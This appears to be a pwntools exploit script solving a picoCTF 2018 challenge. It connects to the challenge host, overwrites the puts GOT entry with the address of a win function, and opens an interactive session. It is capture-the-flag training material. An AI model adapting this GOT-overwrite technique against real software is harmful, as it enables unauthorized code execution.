from pwn import *

target = ELF('./auth')

r = remote('2018shell1.picoctf.com', 54664)

r.sendlineafter('Where would you like to write', hex(target.got['puts']))
r.sendlineafter('what value would you like to write', hex(target.symbols['win']))

r.interactive()
